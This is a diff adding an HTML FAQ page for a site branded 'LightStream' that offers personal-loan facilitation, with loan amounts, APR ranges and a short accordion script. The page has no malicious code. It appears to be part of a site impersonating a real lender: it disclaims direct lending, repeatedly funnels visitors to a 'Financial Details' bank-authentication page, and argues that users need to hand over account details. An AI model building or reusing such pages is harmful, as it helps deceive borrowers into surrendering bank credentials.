@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FAQs - LightStream</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
+            min-height: 100vh;
+        }
+        .glass-effect {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .neon-glow {
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5), 0 0 40px rgba(255, 215, 0, 0.3);
+        }
+        .text-cool {
+            color: #ffa500;
+        }
+        .cool-button {
+            background: linear-gradient(45deg, #000000, #333333);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .cool-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.4);
+        }
+        .cool-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            transition: left 0.5s;
+        }
+        .cool-button:hover::before {
+            left: 100%;
+        }
+        .bg-cool {
+            background: rgba(0, 0, 0, 0.7);
+            border-color: #ffa500;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+        }
+        .bg-cool-card {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+    </style>
+</head>
+<body class="bg-black">
+    <!-- Header Navigation -->
+    <header class="glass-effect sticky top-0 z-50">
+        <nav class="container mx-auto px-4 py-4">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-8">
+                <div class="flex items-center space-x-2">
+                    <!-- Professional Logo - Full Width -->
+                    <div class="relative">
+                        <img src="images/newlogo.png" alt="LightStream Logo" class="logo-img" style="height: 68px; width: auto; max-width: none !important; max-height: none !important; object-fit: contain; background: transparent !important; filter: brightness(0) invert(1);">
+                        <div class="absolute -top-1 -right-1 w-3 h-3 bg-green-500 rounded-full border-2 border-white"></div>
+                    </div>
+                </div>
+                    <div class="hidden md:flex space-x-6">
+                        <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
+                        <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
+                        <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
+                        <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
+                    </div>
+                </div>
+                <div class="hidden md:flex space-x-4">
+                    <a href="login.html" class="text-white hover:text-cool font-medium">Account</a>
+                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
+                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Financial Details</a>
+                </div>
+                <button class="md:hidden text-white" id="mobileMenuBtn">
+                    <i class="fas fa-bars text-2xl"></i>
+                </button>
+            </div>
+            <!-- Mobile Menu -->
+            <div class="hidden md:hidden mt-4 pb-4" id="mobileMenu">
+                <div class="flex flex-col space-y-3">
+                    <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
+                    <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
+                    <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
+                    <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
+                    <a href="login.html" class="text-white hover:text-cool font-medium">Account</a>
+                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
+                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Financial Details</a>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- FAQs Content -->
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
+        <div class="text-center mb-12">
+            <h1 class="text-4xl font-bold text-white mb-4">Frequently Asked Questions</h1>
+            <p class="text-gray-300 text-lg">Find answers to common questions about our loan facilitation services</p>
+        </div>
+
+        <div class="max-w-4xl mx-auto space-y-6">
+            <!-- Loan Application FAQ -->
+            <div class="bg-gray-800 rounded-lg border border-yellow-500">
+                <button class="w-full px-6 py-4 text-left flex justify-between items-center hover:bg-gray-700 transition duration-200">
+                    <h3 class="text-lg font-semibold text-white">How do I apply for a personal loan?</h3>
+                    <i class="fas fa-chevron-down gold-accent"></i>
+                </button>
+                <div class="px-6 py-4 border-t border-gray-700">
+                    <p class="text-gray-300">You can apply for a personal loan by filling out our online application form. The process takes about 10-15 minutes and you'll need to provide personal information, employment details, and financial institution information. We connect users with lending partners. We do not provide loans directly.</p>
+                </div>
+            </div>
+
+            <!-- Loan Amount FAQ -->
+            <div class="bg-gray-800 rounded-lg border border-yellow-500">
+                <button class="w-full px-6 py-4 text-left flex justify-between items-center hover:bg-gray-700 transition duration-200">
+                    <h3 class="text-lg font-semibold text-white">What loan amounts are available?</h3>
+                    <i class="fas fa-chevron-down gold-accent"></i>
+                </button>
+                <div class="px-6 py-4 border-t border-gray-700">
+                    <p class="text-gray-300">Our lending partners offer personal loans from $2,000 to $25,000. The exact amount you can borrow depends on your credit profile, income, and other factors determined by the lending partners.</p>
+                </div>
+            </div>
+
+            <!-- Interest Rates FAQ -->
+            <div class="bg-gray-800 rounded-lg border border-yellow-500">
+                <button class="w-full px-6 py-4 text-left flex justify-between items-center hover:bg-gray-700 transition duration-200">
+                    <h3 class="text-lg font-semibold text-white">What are the interest rates?</h3>
+                    <i class="fas fa-chevron-down gold-accent"></i>
+                </button>
+                <div class="px-6 py-4 border-t border-gray-700">
+                    <p class="text-gray-300">Interest rates from our lending partners typically range from 7.99% to 15.99% APR. Your rate depends on your credit profile, loan amount, and loan term as determined by the lending partners. We connect users with lending partners who offer competitive rates for qualified applicants.</p>
+                </div>
+            </div>
+
+            <!-- Credit Score FAQ -->
+            <div class="bg-gray-800 rounded-lg border border-yellow-500">
+                <button class="w-full px-6 py-4 text-left flex justify-between items-center hover:bg-gray-700 transition duration-200">
+                    <h3 class="text-lg font-semibold text-white">What credit score do I need?</h3>
+                    <i class="fas fa-chevron-down gold-accent"></i>
+                </button>
+                <div class="px-6 py-4 border-t border-gray-700">
+                    <p class="text-gray-300">While our lending partners consider applicants with various credit profiles, generally a credit score of 660 or higher will give you better rates and terms. However, our lending partners have options for applicants with lower credit scores as well. We connect users with lending partners. We do not provide loans directly.</p>
+                </div>
+            </div>
+
+            <!-- Bank Authentication FAQ -->
+            <div class="bg-gray-800 rounded-lg border border-yellow-500">
+                <button class="w-full px-6 py-4 text-left flex justify-between items-center hover:bg-gray-700 transition duration-200">
+                    <h3 class="text-lg font-semibold text-white">Why do I need to provide financial details?</h3>
+                    <i class="fas fa-chevron-down gold-accent"></i>
+                </button>
+                <div class="px-6 py-4 border-t border-gray-700">
+                    <p class="text-gray-300">Financial details help our lending partners verify your identity and account information quickly and efficiently. This allows lending partners to process your loan application faster and ensure funds are deposited to the correct account. We connect users with lending partners. We do not provide loans directly.</p>
+                </div>
+            </div>
+
+            <!-- Processing Time FAQ -->
+            <div class="bg-gray-800 rounded-lg border border-yellow-500">
+                <button class="w-full px-6 py-4 text-left flex justify-between items-center hover:bg-gray-700 transition duration-200">
+                    <h3 class="text-lg font-semibold text-white">How long does the review process take?</h3>
+                    <i class="fas fa-chevron-down gold-accent"></i>
+                </button>
+                <div class="px-6 py-4 border-t border-gray-700">
+                    <p class="text-gray-300">Most applications are reviewed by lending partners within 1-2 business days. Once reviewed and approved by a lending partner, funds are typically deposited into your account within 1 business day. We connect users with lending partners. We do not provide loans directly.</p>
+                </div>
+            </div>
+
+            <!-- Repayment FAQ -->
+            <div class="bg-gray-800 rounded-lg border border-yellow-500">
+                <button class="w-full px-6 py-4 text-left flex justify-between items-center hover:bg-gray-700 transition duration-200">
+                    <h3 class="text-lg font-semibold text-white">How do I make loan payments?</h3>
+                    <i class="fas fa-chevron-down gold-accent"></i>
+                </button>
+                <div class="px-6 py-4 border-t border-gray-700">
+                    <p class="text-gray-300">Our lending partners offer flexible payment options including various digital payment methods, online payments, and other convenient payment options. You can choose the payment method that works best for you through the lending partner. We connect users with lending partners. We do not provide loans directly.</p>
+                </div>
+            </div>
+
+            <!-- Early Payment FAQ -->
+            <div class="bg-gray-800 rounded-lg border border-yellow-500">
+                <button class="w-full px-6 py-4 text-left flex justify-between items-center hover:bg-gray-700 transition duration-200">
+                    <h3 class="text-lg font-semibold text-white">Can I pay off my loan early?</h3>
+                    <i class="fas fa-chevron-down gold-accent"></i>
+                </button>
+                <div class="px-6 py-4 border-t border-gray-700">
+                    <p class="text-gray-300">Most lending partners don't charge prepayment penalties. You can typically pay off your loan early at any time without any additional fees, subject to the lending partner's specific terms.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Contact Section -->
+        <div class="mt-12 text-center">
+            <h2 class="text-2xl font-bold gold-accent mb-4">Still have questions?</h2>
+            <p class="text-gray-300 mb-6">Our customer service team is here to help</p>
+            <a href="contact.html" class="inline-block bg-yellow-500 text-gray-900 py-3 px-8 rounded-lg font-semibold hover-gold transition duration-200">
+                Contact Us
+            </a>
+        </div>
+    </div>
+
+    <!-- Canonical Footer -->
+    <link rel="stylesheet" href="footer.css">
+    <!-- Canonical Footer Component - LightStream Website -->
+    <footer>
+        <div class="footer-container">
+            <!-- Footer Links Section -->
+            <div class="footer-links">
+                <a href="personal-loans.html">Personal Loans</a>
+                <a href="bank-auth.html">Financial Details</a>
+                <a href="faqs.html">FAQs</a>
+                <a href="#">Support</a>
+                <a href="contact.html">Contact Us</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+            </div>
+            
+            <!-- Footer Contact Section -->
+            <div class="footer-contact">
+                <!-- Social Media Icons -->
+                <div class="social-icons">
+                    <a href="#" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
+                    <a href="#" aria-label="Facebook"><i class="fab fa-facebook"></i></a>
+                    <a href="#" aria-label="X"><i class="fab fa-x-twitter"></i></a>
+                    <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+                </div>
+            </div>
+            
+            <!-- Footer Legal Section -->
+            <div class="footer-legal">
+                <p><strong>Simple & Transparent Services:</strong> We connect users with lending partners. Terms and rates are determined by lending partners. We do not provide loans directly.</p>
+                <p><strong>Payment Example:</strong> $306.44 monthly payment for a $10,000 loan at 10.00% APR for 36 months.</p>
+                <p><strong>Important Note:</strong> This is a loan facilitation platform. All lending decisions are made by our lending partners.</p>
+                
+                <div class="footer-simple">
+                    <div class="footer-simple-section">
+                        <h4>Business Hours</h4>
+                        <p><strong>Customer Service:</strong><br>
+                        Monday - Friday: 9:30 AM - 7: PM<br>
+                        Saturday: Noon - 4:00 PM</p>
+                    </div>
+                    <div class="footer-simple-section">
+                        <h4>Contact Information</h4>
+                        <p>
+                        PO Box 117320<br>
+                        Atlanta, GA 30368-7320
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="legal-copyright">
+                    <p>&copy; 2026 LightStream Financial Services. All rights reserved.</p>
+                    <p>This is a loan facilitation platform. We connect users with lending partners.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <script>
+        // Simple accordion functionality
+        document.querySelectorAll('.bg-gray-800 button').forEach(button => {
+            button.addEventListener('click', () => {
+                const content = button.nextElementSibling;
+                const icon = button.querySelector('i');
+                
+                if (content.style.display === 'block') {
+                    content.style.display = 'none';
+                    icon.classList.remove('fa-chevron-up');
+                    icon.classList.add('fa-chevron-down');
+                } else {
+                    content.style.display = 'block';
+                    icon.classList.remove('fa-chevron-down');
+                    icon.classList.add('fa-chevron-up');
+                }
+            });
+        });
+        
+        // Wait for DOM to be fully loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            // Mobile menu toggle (matching personal-loans.html)
+            const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+            const mobileMenu = document.getElementById('mobileMenu');
+
+            if (mobileMenuBtn && mobileMenu) {
+                mobileMenuBtn.addEventListener('click', () => {
+                    mobileMenu.classList.toggle('hidden');
+                });
+            }
+        });
+    </script>
+    <!-- <script src="chatbot.js"></script> Temporarily disabled -->
+</body>
+</html>
